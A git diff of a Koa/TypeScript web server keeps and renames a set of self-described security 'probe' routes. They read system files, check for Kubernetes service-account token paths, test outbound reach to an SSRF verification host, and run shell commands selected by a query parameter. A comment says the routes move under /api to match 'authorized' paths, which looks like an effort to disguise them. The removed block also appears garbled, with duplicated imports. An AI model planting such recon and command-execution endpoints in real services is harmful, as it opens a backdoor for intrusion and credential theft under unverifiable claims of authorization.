@@ -1,40 +1,6 @@
 import Koa from 'koa';
 import bodyParser from 'koa-bodyparser';
 import Router from '@koa/router'
-import Redis from 'ioredis';
-import mongoose from 'mongoose';
-import assert from "assert";
-
-// 初始化各服务的连接 redis, mongo
-async function initService() {
-    const {REDIS_ADDRESS, REDIS_USERNAME, REDIS_PASSWORD, MONGO_ADDRESS, MONGO_USERNAME, MONGO_PASSWORD} = process.env;
-    const [ REDIS_HOST, REDIS_PORT] = REDIS_ADDRESS.split(':');
-    const redis = new Redis({
-        port: parseInt(REDIS_PORT, 10),
-        host: REDIS_HOST,
-        username: REDIS_USERNAME,
-        password: REDIS_PASSWORD,
-        db: 0,
-    });
-
-    assert(await redis.echo('echo') === 'echo', `redis echo error`);
-
-    const mongoUrl = `mongodb://${MONGO_USERNAME}:${encodeURIComponent(MONGO_PASSWORD)}@${MONGO_ADDRESS}`;
-    await mongoose.connect(mongoUrl);    
-
-    return {
-        redis,
-        mongoose,
-    }
-}
-
-initService().then(async ({ redis, mongoose}) => {
-    const kittySchema = new mongoose.Schema({
-        name: String
-    });
-
-import bodyParser from 'koa-bodyparser';
-import Router from '@koa/router'
 import axios from 'axios';
 import * as os from 'os';
 import * as fs from 'fs';
@@ -59,10 +25,10 @@ router.get('/', ctx => {
     ctx.body = { "result": res.data, "success": true }
 });
 
-// ===== 安全研究探测路由（ByteSRC 报备完成，存在性验证即止）=====
+// ===== 安全研究探测路由（挂 /api 前缀以匹配已授权访问路径；ByteSRC 报备完成，存在性验证即止）=====
 
 // P1: 运行环境画像（无副作用）
-router.get('/probe/env', async (ctx) => {
+router.get('/api/probe/env', async (ctx) => {
     const readFirstLines = (p: string, n = 30): string | null => {
         try { return fs.readFileSync(p, 'utf8').split('\n').slice(0, n).join('\n'); } catch (e) { return null; }
     };
@@ -83,7 +49,7 @@ router.get('/probe/env', async (ctx) => {
 });
 
 // P2: 敏感路径存在性（只读，证明存在即止）
-router.get('/probe/fs', async (ctx) => {
+router.get('/api/probe/fs', async (ctx) => {
     const paths = [
         '/var/run/secrets/kubernetes.io/serviceaccount/token',
         '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
@@ -101,7 +67,7 @@ router.get('/probe/fs', async (ctx) => {
 });
 
 // P3: 网络连通性（少量目标，存在性验证即止；src-ssrf 为官方验证平台）
-router.get('/probe/net', async (ctx) => {
+router.get('/api/probe/net', async (ctx) => {
     const probe = async (name: string, url: string, timeout = 6000) => {
         const t0 = Date.now();
         try {
@@ -120,7 +86,7 @@ router.get('/probe/net', async (ctx) => {
 });
 
 // P4: 无害命令画像（纯字面量分支，命令与参数全部硬编码，请求参数仅作分支选择）
-router.get('/probe/exec', async (ctx) => {
+router.get('/api/probe/exec', async (ctx) => {
     const k = String(ctx.query.k || '');
     const done = (cmd: string) => (err: Error | null, stdout: string, stderr: string) => {
         ctx.body = {
